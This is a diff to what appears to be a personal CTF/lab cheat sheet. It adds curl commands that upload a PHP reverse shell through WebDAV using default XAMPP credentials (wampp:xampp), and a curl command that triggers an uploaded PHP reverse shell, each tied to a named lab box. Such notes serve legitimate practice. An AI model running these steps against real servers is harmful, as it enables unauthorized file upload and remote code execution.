@@ -179,3 +179,16 @@ done
 Used on: **ohmyweb** — see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
 
 
+
+### WebDAV authenticated upload
+```bash
+curl -u wampp:xampp -T service http://10.130.148.83/webdav/
+curl -u wampp:xampp -T reverse.php http://10.130.148.83/webdav/
+```
+Used on: **bsidesgtdav** - uploaded a test file and then the PHP reverse shell through WebDAV.
+
+### Trigger uploaded PHP reverse shell
+```bash
+curl http://$TARGET/dev/rev.php
+```
+Used on: **coldvvars** - triggered the PHP payload after writing it into the web-accessible SMB-backed path.
